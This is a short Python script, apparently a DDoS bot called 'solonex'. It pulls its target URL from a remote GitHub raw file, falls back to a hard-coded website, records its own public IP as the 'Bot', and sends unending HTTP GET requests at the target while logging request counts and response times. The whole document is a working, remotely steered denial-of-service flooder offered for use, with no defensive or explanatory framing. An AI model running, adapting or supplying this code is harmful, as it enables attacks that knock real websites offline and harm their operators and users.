import requests
from colorama import Fore
import time

class config:
    get_target = "https://raw.githubusercontent.com/TheSadError/solonex/main/target.txt" # put here your targets github page [raw]
    myip = "https://api.ipify.org/?format=text"
    org = "https://schildr.com/"




def solonex_start():

    while True:
        cnt = 0
        try:
            getsite =  requests.get(config.get_target,timeout=2).text
        except:
            getsite = config.org
        config.myip =  requests.get(config.myip).text
        try:
            while True:
                try:
                    start = time.time()
                    try:
                        send_req = requests.get(getsite)
                    except:
                        try:
                            send_req = requests.get(getsite)
                        except:
                            pass
                        
                    end = time.time()    
                    ms = 0
                    
                    if int((end-start)*100)>99:
                        ms = int((end-start)*100)
                    else:
                        ms = int((end-start)*100)
                    print(Fore.BLUE+f"Requests : {cnt} | Bot : {config.myip} | To : {getsite} | Status : {send_req.status_code} | Response Time : {ms}")
                    cnt+=1
                except:
                    print(Fore.RED+f"Could not connect to {getsite}! Error : {send_req}! Bot : {config.myip} | Response Time : {ms}")
        except:
            pass
        


if __name__ == "__main__":
    try:
        solonex_start()
    except:
        pass
